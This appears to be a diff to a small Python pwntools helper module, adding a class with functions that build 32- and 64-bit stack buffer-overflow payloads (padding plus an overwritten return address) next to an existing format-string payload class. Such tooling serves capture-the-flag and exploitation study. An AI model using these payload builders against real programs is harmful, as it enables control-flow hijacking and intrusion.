@@ -1,3 +1,5 @@
+from pwn import *
+
 class fsb:
 
     def fsb64(off, data):
@@ -35,3 +37,15 @@ class fsb:
         payload += "A" * mapp
 
         return bytes(payload, 'utf-8')
+
+class bof:
+    def bof32(offset, ret):
+        payload = b"A" * (offset + 4)
+        payload += p32(ret)
+        return payload
+
+
+    def bof64(offset, ret):
+        payload = b"A" * (offset + 8)
+        payload += p64(ret)
+        return payload
